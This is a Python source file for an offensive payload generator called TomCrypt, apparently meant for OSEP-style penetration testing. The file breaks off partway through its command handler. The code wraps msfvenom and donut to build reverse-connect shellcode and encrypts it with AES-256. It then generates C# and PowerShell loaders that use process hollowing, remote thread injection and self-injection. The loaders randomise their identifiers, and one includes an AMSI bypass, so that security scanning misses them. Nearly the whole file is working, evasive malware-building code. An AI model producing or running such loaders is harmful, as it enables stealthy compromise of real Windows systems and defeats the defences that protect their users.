#!/usr/bin/env python3
"""TomCrypt v3.0.0 - OSEP payload generator."""
from __future__ import annotations

import argparse
import os
import random
import re
import string
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

__version__ = "3.0.0"

# ── Colour helpers ─────────────────────────────────────────────────────────────
_COLOUR = sys.stdout.isatty()

def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOUR else text

def ok(msg: str)   -> str: return _c("32", f"[+] {msg}")
def info(msg: str) -> str: return _c("36", f"[*] {msg}")
def warn(msg: str) -> str: return _c("33", f"[!] {msg}")
def err(msg: str)  -> str: return _c("31", f"[-] {msg}")
def hint(msg: str) -> str: return _c("90", f"[i] {msg}")

class TomCryptError(Exception):
    pass

# ── Config ─────────────────────────────────────────────────────────────────────
@dataclass
class Config:
    payload: str
    lhost:   str
    lport:   int
    target:  str         = r"C:\Windows\System32\svchost.exe"
    output:  Optional[Path] = None

# ── Crypto: AES-256-CBC ────────────────────────────────────────────────────────
_AES_ALG_ID = 0x6610  # CALG_AES_256

@dataclass
class EncryptResult:
    key:          bytes
    iv:           bytes
    ciphertext:   bytes
    original_len: int

def _require_cryptography() -> None:
    """Raise a clear error if the cryptography package is missing."""
    try:
        import cryptography  # noqa: F401
    except ImportError:
        raise TomCryptError(
            "pip install cryptography  (required for AES-256-CBC)\n"
            "  pycryptodome is no longer used — cryptography is the single dependency."
        )


def encrypt_aes256(data: bytes) -> EncryptResult:
    """AES-256-CBC with explicit PKCS7 padding via the cryptography hazmat API.

    Explicit padding matters: the old pycryptodome/openssl approach applied
    padding implicitly and differently depending on which backend ran. The
    hazmat path is unambiguous — PKCS7(128) pads to a 16-byte boundary before
    encryption, and CryptDecrypt(Final=true) strips it after decryption. The
    same call, the same result, every time.
    """
    _require_cryptography()
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as crypto_padding

    key = os.urandom(32)   # AES-256
    iv  = os.urandom(16)   # one AES block

    padder = crypto_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher    = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ct        = encryptor.update(padded) + encryptor.finalize()

    return EncryptResult(key=key, iv=iv, ciphertext=ct, original_len=len(data))

# ── Architecture helpers ───────────────────────────────────────────────────────
def detect_arch(payload: str) -> str:
    """Return 'x64' or 'x86'.
    Matches msfvenom's own convention: /x64/ in path = x64, everything else = x86.
    windows/meterpreter/reverse_tcp (no marker) is x86 — that is the x86 payload.
    Only windows/x64/... variants are x64.
    """
    if "/x64/" in payload or payload.endswith("/x64"):
        return "x64"
    return "x86"


def resolve_arch(payload: str, arch_flag: Optional[str] = None) -> str:
    """Resolve architecture consistently from optional -a flag or payload path.

    Prefer the explicit flag when supplied. Validate against the payload's
    inherent architecture and raise on mismatch so the generated shellcode
    and the loader architecture always agree.
    """
    detected = detect_arch(payload)
    if arch_flag is not None:
        if arch_flag not in ("x64", "x86"):
            raise TomCryptError(f"Invalid architecture '{arch_flag}'. Must be x64 or x86.")
        if arch_flag != detected:
            raise TomCryptError(
                f"-a {arch_flag} does not match payload '{payload}' (detected {detected}).\n"
                "  Use a matching payload string or omit -a to auto-detect from the payload path."
            )
        return arch_flag
    return detected

# ── Network helpers ────────────────────────────────────────────────────────────
def resolve_lhost(value: str) -> str:
    """Accept an IP or interface name; return IPv4 string."""
    import socket
    try:
        socket.inet_aton(value)
        return value
    except OSError:
        pass
    print(info(f"Resolving interface '{value}'..."))
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show", value], text=True)
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    raise TomCryptError(
        f"Could not resolve interface '{value}'. Pass an IP address directly."
    )

# ── msfvenom wrapper ───────────────────────────────────────────────────────────
def run_msfvenom(cfg: Config, arch: Optional[str] = None) -> bytes:
    """Generate raw shellcode, always passing an explicit -a architecture flag."""
    if arch is None:
        arch = detect_arch(cfg.payload)
    cmd  = ["msfvenom", "-p", cfg.payload, "-a", arch]
    cmd += [f"LHOST={cfg.lhost}", f"LPORT={cfg.lport}", "-f", "raw"]
    print(info(f"msfvenom: {' '.join(cmd)}"))
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=120)
    except FileNotFoundError:
        raise TomCryptError("msfvenom not found.")
    except subprocess.TimeoutExpired:
        raise TomCryptError("msfvenom timed out after 120 s.")
    if p.returncode != 0:
        raise TomCryptError(f"msfvenom failed:\n{(p.stderr or p.stdout).decode()}")
    if not p.stdout:
        raise TomCryptError("msfvenom produced zero-length shellcode.")
    return p.stdout

# ── donut wrapper ──────────────────────────────────────────────────────────────
def run_donut(agent_path: Path, lhost: str, lport: int) -> bytes:
    """Convert agent.exe to raw x64 shellcode via donut.

    Equivalent to:
      donut -f 1 -a 2 -p "-connect LHOST:LPORT -ignore-cert" -i agent.exe -o tmp.bin
    Connect parameters are baked in at generation time; no args at runtime.
    """
    import tempfile
    fd, tmp_str = tempfile.mkstemp(suffix=".bin")
    os.close(fd)
    tmp = Path(tmp_str)
    cmd = [
        "donut", "-f", "1", "-a", "2",
        "-p", f"-connect {lhost}:{lport} -ignore-cert",
        "-i", str(agent_path),
        "-o", str(tmp),
    ]
    print(info(f"donut   : {' '.join(cmd)}"))
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=120)
    except FileNotFoundError:
        tmp.unlink(missing_ok=True)
        raise TomCryptError("donut not found in PATH.")
    except subprocess.TimeoutExpired:
        tmp.unlink(missing_ok=True)
        raise TomCryptError("donut timed out after 120 s.")
    if p.returncode != 0:
        tmp.unlink(missing_ok=True)
        raise TomCryptError(f"donut failed:\n{(p.stderr or p.stdout).decode()}")
    if not tmp.exists() or tmp.stat().st_size == 0:
        tmp.unlink(missing_ok=True)
        raise TomCryptError("donut produced empty output.")
    data = tmp.read_bytes()
    tmp.unlink()
    print(info(f"Shellcode: {len(data):,} B (donut x64 raw)"))
    return data


# ── Identifier randomisation ───────────────────────────────────────────────────
def rand_id(n: int = 9) -> str:
    """Random C#/PS1-safe identifier. Starts with uppercase letter."""
    return (
        random.choice(string.ascii_uppercase) +
        "".join(random.choices(string.ascii_letters + string.digits, k=n - 1))
    )

def rand_junk(n: int = 16) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

# ── Byte array formatters ──────────────────────────────────────────────────────
_COLS = 16

def cs_byte_array(name: str, data: bytes) -> str:
    """C# inline byte array declaration, 16 bytes per row."""
    rows = [
        ", ".join(f"0x{b:02x}" for b in data[i : i + _COLS])
        for i in range(0, len(data), _COLS)
    ]
    inner = ",\n            ".join(rows)
    return (
        f"byte[] {name} = new byte[{len(data)}] {{\n"
        f"            {inner}\n"
        f"        }};"
    )

def ps1_byte_array(data: bytes) -> str:
    """PowerShell byte array literal."""
    return "[byte[]]@(" + ",".join(str(b) for b in data) + ")"

# ── Compiler ───────────────────────────────────────────────────────────────────
def compile_cs(cs_path: Path, arch: str, refs: list = None) -> Path:
    exe_path = cs_path.with_suffix(".exe")
    cmd = ["mcs", f"/platform:{arch}", str(cs_path), f"-out:{exe_path}"]
    if refs:
        cmd += [f"-r:{r}" for r in refs]
    print(info(f"Compiling: {' '.join(cmd)}"))
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    except FileNotFoundError:
        raise TomCryptError("mcs not found. Install with: sudo apt install mono-mcs")
    if p.returncode != 0:
        raise TomCryptError(f"Compilation failed:\n{p.stderr or p.stdout}")
    size = exe_path.stat().st_size
    print(ok(f"Binary  : {exe_path}  ({size:,} B)"))
    return exe_path

# ── certutil encoder ───────────────────────────────────────────────────────────
def certutil_encode(data: bytes) -> str:
    """Replicate 'certutil -encode' output: PEM header/footer, 64-char base64 lines, CRLF.
    certutil -decode on Windows accepts this verbatim — no Windows dependency on Kali.
    """
    import base64
    b64   = base64.b64encode(data).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return (
        "-----BEGIN CERTIFICATE-----\r\n"
        + "\r\n".join(lines)
        + "\r\n-----END CERTIFICATE-----\r\n"
    )

# ── Shared CryptoAPI decrypt block (C#) ───────────────────────────────────────
def _cs_decrypt_func(fn: str, enc: str, key: str, iv: str) -> str:
    return f"""\
    static byte[] {fn}(byte[] {enc}, byte[] {key}, byte[] {iv})
    {{
        IntPtr hProv = IntPtr.Zero, hKey = IntPtr.Zero;
        try
        {{
            if (!CryptAcquireContext(out hProv, null, null, 24, 0xF0000000))
                throw new Exception();
            byte[] blob = new byte[12 + {key}.Length];
            blob[0] = 0x08; blob[1] = 0x02;
            BitConverter.GetBytes((uint)0x6610).CopyTo(blob, 4);
            BitConverter.GetBytes((uint){key}.Length).CopyTo(blob, 8);
            {key}.CopyTo(blob, 12);
            if (!CryptImportKey(hProv, blob, (uint)blob.Length, IntPtr.Zero, 0, out hKey))
                throw new Exception();
            CryptSetKeyParam(hKey, 1, {iv}, 0);
            byte[] data = new byte[{enc}.Length];
            Array.Copy({enc}, data, {enc}.Length);
            uint len = (uint)data.Length;
            if (!CryptDecrypt(hKey, IntPtr.Zero, true, 0, data, ref len))
                throw new Exception();
            byte[] result = new byte[len];
            Array.Copy(data, result, (int)len);
            return result;
        }}
        finally
        {{
            if (hKey  != IntPtr.Zero) CryptDestroyKey(hKey);
            if (hProv != IntPtr.Zero) CryptReleaseContext(hProv, 0);
        }}
    }}"""

# ── Shared CryptoAPI decrypt block (PS1) ──────────────────────────────────────
def _ps1_decrypt_func(fn: str, cls: str) -> str:
    return f"""\
function {fn}($enc, $key, $iv) {{
    $hProv = [IntPtr]::Zero; $hKey = [IntPtr]::Zero
    [{cls}]::CryptAcquireContext([ref]$hProv, $null, $null, 24, 0xF0000000) | Out-Null
    $blob = New-Object byte[] (12 + $key.Length)
    $blob[0] = 0x08; $blob[1] = 0x02
    [BitConverter]::GetBytes([uint32]0x6610).CopyTo($blob, 4)
    [BitConverter]::GetBytes([uint32]$key.Length).CopyTo($blob, 8)
    $key.CopyTo($blob, 12)
    [{cls}]::CryptImportKey($hProv, $blob, [uint32]$blob.Length, [IntPtr]::Zero, 0, [ref]$hKey) | Out-Null
    [{cls}]::CryptSetKeyParam($hKey, 1, $iv, 0) | Out-Null
    $data = New-Object byte[] $enc.Length
    [Array]::Copy($enc, $data, $enc.Length)
    $len = [uint32]$data.Length
    [{cls}]::CryptDecrypt($hKey, [IntPtr]::Zero, $true, 0, $data, [ref]$len) | Out-Null
    [{cls}]::CryptDestroyKey($hKey) | Out-Null
    [{cls}]::CryptReleaseContext($hProv, 0) | Out-Null
    $out = New-Object byte[] $len
    [Array]::Copy($data, $out, [int]$len)
    return $out
}}"""

# ══════════════════════════════════════════════════════════════════════════════
# Builders - C#
# ══════════════════════════════════════════════════════════════════════════════

def build_cs_hollow_x64(result: EncryptResult, cfg: Config) -> str:
    """D/Invoke process hollowing loader - x64."""
    cls            = rand_id()
    fn             = rand_id()
    e, k, v, sc   = rand_id(), rand_id(), rand_id(), rand_id()
    junk           = rand_junk()

    return f"""\
// =====================================================
// TomCrypt v{__version__} - Process Hollowing Loader (x64)
// {junk}
// =====================================================
// Payload : {cfg.payload}
// LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
// Target  : {cfg.target}
// Encrypt : AES-256-CBC   Mode  : D/Invoke
// =====================================================
using System;
using System.Runtime.InteropServices;

class {cls}
{{
    // ── Bootstrap (static - required to resolve everything else) ──────────
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr LoadLibrary(string n);

    // ── CryptoAPI (AES-256-CBC) ───────────────────────────────────────────
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDestroyKey(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptReleaseContext(IntPtr h, uint f);

    // ── Structs ───────────────────────────────────────────────────────────
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {{
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public uint   dwX, dwY, dwXSize, dwYSize,
                      dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {{
        public IntPtr hProcess, hThread;
        public uint   dwProcessId, dwThreadId;
    }}
    // x64 CONTEXT - only fields we read/write are declared.
    // Size = 1232 ensures the full buffer is allocated for GetThreadContext.
    [StructLayout(LayoutKind.Explicit, Size = 1232)]
    struct CONTEXT
    {{
        [FieldOffset(0x30)] public uint  ContextFlags;
        [FieldOffset(0xF8)] public ulong Rip;
    }}

    // ── D/Invoke delegate types ───────────────────────────────────────────
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    delegate bool CreateProcessW_t(string app, string cmd, IntPtr pa, IntPtr ta,
        bool inherit, uint flags, IntPtr env, string dir,
        [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate IntPtr VirtualAllocEx_t(IntPtr h, IntPtr addr, uint size, uint type, uint prot);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool WriteProcessMemory_t(IntPtr h, IntPtr base_, byte[] buf, uint size, out IntPtr written);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool VirtualProtectEx_t(IntPtr h, IntPtr addr, uint size, uint prot, out uint old);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool GetThreadContext_t(IntPtr h, [In, Out] ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool SetThreadContext_t(IntPtr h, [In] ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate uint ResumeThread_t(IntPtr h);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool CloseHandle_t(IntPtr h);

    // ── Runtime resolver ──────────────────────────────────────────────────
    static T R<T>(string mod, string name) where T : class
    {{
        IntPtr h = GetModuleHandle(mod);
        if (h == IntPtr.Zero) h = LoadLibrary(mod);
        IntPtr p = GetProcAddress(h, name);
        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
    }}

    // ── AES-256-CBC decrypt ───────────────────────────────────────────────
{_cs_decrypt_func(fn, e, k, v)}

    static void Main()
    {{
        try
        {{
            {cs_byte_array(e, result.ciphertext)}
            {cs_byte_array(k, result.key)}
            {cs_byte_array(v, result.iv)}
            byte[] {sc} = {fn}({e}, {k}, {v});

            var pCP  = R<CreateProcessW_t>     ("kernel32.dll", "CreateProcessW");
            var pVAX = R<VirtualAllocEx_t>     ("kernel32.dll", "VirtualAllocEx");
            var pWPM = R<WriteProcessMemory_t> ("kernel32.dll", "WriteProcessMemory");
            var pVPX = R<VirtualProtectEx_t>   ("kernel32.dll", "VirtualProtectEx");
            var pGTC = R<GetThreadContext_t>   ("kernel32.dll", "GetThreadContext");
            var pSTC = R<SetThreadContext_t>   ("kernel32.dll", "SetThreadContext");
            var pRT  = R<ResumeThread_t>       ("kernel32.dll", "ResumeThread");
            var pCH  = R<CloseHandle_t>        ("kernel32.dll", "CloseHandle");
            if (pCP == null || pVAX == null || pWPM == null || pVPX == null ||
                pGTC == null || pSTC == null || pRT == null || pCH == null) return;

            var si = new STARTUPINFO();
            si.cb  = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            // CREATE_SUSPENDED = 0x4
            if (!pCP(@"{cfg.target}", null, IntPtr.Zero, IntPtr.Zero,
                     false, 0x4, IntPtr.Zero, null, ref si, out pi)) return;

            IntPtr remote = pVAX(pi.hProcess, IntPtr.Zero, (uint){sc}.Length, 0x3000, 0x04);
            if (remote == IntPtr.Zero) {{ pCH(pi.hProcess); pCH(pi.hThread); return; }}

            IntPtr written;
            pWPM(pi.hProcess, remote, {sc}, (uint){sc}.Length, out written);

            uint old;
            pVPX(pi.hProcess, remote, (uint){sc}.Length, 0x20, out old);

            var ctx = new CONTEXT();
            ctx.ContextFlags = 0x100001; // CONTEXT_AMD64 | CONTEXT_CONTROL
            pGTC(pi.hThread, ref ctx);
            ctx.Rip = (ulong)remote.ToInt64();
            pSTC(pi.hThread, ref ctx);

            pRT(pi.hThread);
            pCH(pi.hProcess);
            pCH(pi.hThread);
        }}
        catch {{ }}
    }}
}}
"""


def build_cs_simple_x86(result: EncryptResult, cfg: Config) -> str:
    """D/Invoke self-injection loader - x86 fallback."""
    cls          = rand_id()
    fn           = rand_id()
    e, k, v, sc = rand_id(), rand_id(), rand_id(), rand_id()
    junk         = rand_junk()

    return f"""\
// =====================================================
// TomCrypt v{__version__} - Self-Injection Loader (x86)
// {junk}
// =====================================================
// Payload : {cfg.payload}
// LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
// Encrypt : AES-256-CBC   Mode  : D/Invoke
// Note    : x86 - self-injecting (hollow not supported on x86)
// =====================================================
using System;
using System.Runtime.InteropServices;

class {cls}
{{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr LoadLibrary(string n);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDestroyKey(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptReleaseContext(IntPtr h, uint f);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate IntPtr VirtualAlloc_t(IntPtr addr, uint size, uint type, uint prot);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool VirtualProtect_t(IntPtr addr, uint size, uint prot, out uint old);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThread_t(IntPtr ta, uint stack, IntPtr start, IntPtr param, uint flags, out IntPtr tid);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint WaitForSingleObject_t(IntPtr h, uint ms);

    static T R<T>(string mod, string name) where T : class
    {{
        IntPtr h = GetModuleHandle(mod);
        if (h == IntPtr.Zero) h = LoadLibrary(mod);
        IntPtr p = GetProcAddress(h, name);
        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
    }}

{_cs_decrypt_func(fn, e, k, v)}

    static void Main()
    {{
        try
        {{
            {cs_byte_array(e, result.ciphertext)}
            {cs_byte_array(k, result.key)}
            {cs_byte_array(v, result.iv)}
            byte[] {sc} = {fn}({e}, {k}, {v});

            var pVA   = R<VirtualAlloc_t>       ("kernel32.dll", "VirtualAlloc");
            var pVP   = R<VirtualProtect_t>     ("kernel32.dll", "VirtualProtect");
            var pCT   = R<CreateThread_t>       ("kernel32.dll", "CreateThread");
            var pWFSO = R<WaitForSingleObject_t>("kernel32.dll", "WaitForSingleObject");
            if (pVA == null || pVP == null || pCT == null || pWFSO == null) return;

            IntPtr addr = pVA(IntPtr.Zero, (uint){sc}.Length, 0x3000, 0x04);
            if (addr == IntPtr.Zero) return;
            Marshal.Copy({sc}, 0, addr, {sc}.Length);

            uint old;
            pVP(addr, (uint){sc}.Length, 0x20, out old);

            IntPtr tid;
            IntPtr ht = pCT(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
            if (ht == IntPtr.Zero) return;
            pWFSO(ht, 0xFFFFFFFF);
        }}
        catch {{ }}
    }}
}}
"""


# ══════════════════════════════════════════════════════════════════════════════
# Builders - PS1/TXT
# ══════════════════════════════════════════════════════════════════════════════

def build_ps1_hollow_x64(result: EncryptResult, cfg: Config) -> str:
    """PS1 cross-process injection loader — x64.

    Follows the Start-Process -> .Id -> OpenProcess pattern to avoid the
    PROCESS_INFORMATION struct marshaling issue that silently zeroed hProcess.
    Adds tomcrypt's AMSI bypass (before Add-Type so C# is not scanned),
    AES-256-CBC encryption, and RW->RX flip instead of RWX.
    """
    cls    = rand_id()
    fn_dec = rand_id()
    v_a    = rand_id()
    v_b    = rand_id()
    v_proc = rand_id()
    v_hp   = rand_id()
    v_rem  = rand_id()
    v_nw   = rand_id()
    v_old  = rand_id()
    v_e    = rand_id()
    v_k    = rand_id()
    v_v    = rand_id()
    v_sc   = rand_id()
    junk   = rand_junk()

    return f"""\
# =====================================================
# TomCrypt v{__version__} - PS1 Inject Loader (x64)
# {junk}
# =====================================================
# Payload : {cfg.payload}
# LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
# Target  : {cfg.target}
# Encrypt : AES-256-CBC
# =====================================================

# AMSI bypass before Add-Type so C# is not scanned
${v_a} = [Ref].Assembly.GetType('System.Manage'+'ment.Automat'+'ion.Amsi'+'Utils')
${v_b} = ${v_a}.GetField('amsiIn'+'itFailed','NonPublic,Static')
${v_b}.SetValue($null,$true)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class {cls} {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}}
"@

function {fn_dec} {{
    Param ($enc, $key, $iv)
    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key     = $key
    $aes.IV      = $iv
    $dec         = $aes.CreateDecryptor()
    $out         = $dec.TransformFinalBlock($enc, 0, $enc.Length)
    $aes.Dispose()
    return $out
}}

${v_e} = {ps1_byte_array(result.ciphertext)}
${v_k} = {ps1_byte_array(result.key)}
${v_v} = {ps1_byte_array(result.iv)}
${v_sc} = {fn_dec} ${v_e} ${v_k} ${v_v}

${v_proc} = Start-Process -FilePath '{cfg.target}' -PassThru -WindowStyle Hidden
Start-Sleep -Milliseconds 500
${v_hp} = [{cls}]::OpenProcess(0x1F0FFF, $false, ${v_proc}.Id)

${v_rem} = [{cls}]::VirtualAllocEx(${v_hp}, [IntPtr]::Zero, [uint32]${v_sc}.Length, 0x3000, 0x04)
${v_nw} = 0
[{cls}]::WriteProcessMemory(${v_hp}, ${v_rem}, ${v_sc}, [uint32]${v_sc}.Length, [ref]${v_nw}) | Out-Null
${v_old} = [uint32]0
[{cls}]::VirtualProtectEx(${v_hp}, ${v_rem}, [uint32]${v_sc}.Length, 0x20, [ref]${v_old}) | Out-Null
[{cls}]::CreateRemoteThread(${v_hp}, [IntPtr]::Zero, 0, ${v_rem}, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
[{cls}]::CloseHandle(${v_hp}) | Out-Null
"""


def build_ps1_simple_x86(result: EncryptResult, cfg: Config) -> str:
    """PS1 self-injection loader - x86 fallback."""
    cls     = rand_id()
    fn      = rand_id()
    e, k, v = rand_id(), rand_id(), rand_id()
    junk    = rand_junk()

    return f"""\
# =====================================================
# TomCrypt v{__version__} - Self-Injection Loader (x86)
# {junk}
# =====================================================
# Payload : {cfg.payload}
# LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
# Encrypt : AES-256-CBC
# Note    : x86 - self-injecting (hollow not supported on x86)
# =====================================================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class {cls} {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr addr, uint size, uint prot, out uint old);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr ta, uint stack, IntPtr start,
        IntPtr param, uint flags, out IntPtr tid);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, int t, int f);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptImportKey(IntPtr h, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptSetKeyParam(IntPtr h, uint p, byte[] d, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptDecrypt(IntPtr h, IntPtr hh, bool fin, uint f, byte[] d, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptDestroyKey(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptReleaseContext(IntPtr h, uint f);
}}
"@

{_ps1_decrypt_func(fn, cls)}

${e} = {ps1_byte_array(result.ciphertext)}
${k} = {ps1_byte_array(result.key)}
${v} = {ps1_byte_array(result.iv)}
$sc = {fn} ${e} ${k} ${v}

$addr = [{cls}]::VirtualAlloc([IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x04)
[Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
$old = [uint32]0
[{cls}]::VirtualProtect($addr, [uint32]$sc.Length, 0x20, [ref]$old) | Out-Null
$tid = [IntPtr]::Zero
$ht = [{cls}]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
[{cls}]::WaitForSingleObject($ht, 0xFFFFFFFF) | Out-Null
"""


# ══════════════════════════════════════════════════════════════════════════════
# hollow subcommand handler
# ══════════════════════════════════════════════════════════════════════════════

_SEP = "=" * 60

def cmd_hollow(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    cfg   = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))
    fmt  = args.format

    if arch == "x86":
        print(warn("x86 payload — ps1/txt will self-inject; exe uses D/Invoke self-injection."))

    print(ok(f"TomCrypt v{__version__} [hollow]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {cfg.lhost}"))
    print(info(f"LPORT    : {cfg.lport}"))
    if fmt == "exe":
        print(info(f"Format   : exe  (D/Invoke process hollowing)"))
    elif arch == "x64":
        print(info(f"Format   : {fmt}  (AMSI bypass + cross-process inject)"))
    else:
        print(info(f"Format   : {fmt}  (self-injection)"))
    if arch == "x64":
        print(info(f"Target   : {cfg.target}"))
    print(info("Encrypt  : AES-256-CBC"))

    # Generate + encrypt shellcode
    shellcode = run_msfvenom(cfg, arch)
    print(info(f"Shellcode: {len(shellcode):,} B"))
    result = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B ciphertext"))

    # Output file stem and directory
    if fmt == "exe":
        default_stem = "HollowLoader" if arch == "x64" else "SimpleLoader"
    else:
        default_stem = "InjectLoader" if arch == "x64" else "SimpleLoader"
    stem    = cfg.output.stem if cfg.output else default_stem
    basedir = cfg.output.parent if cfg.output else Path.cwd()

    serve_url = f"http://{cfg.lhost}"

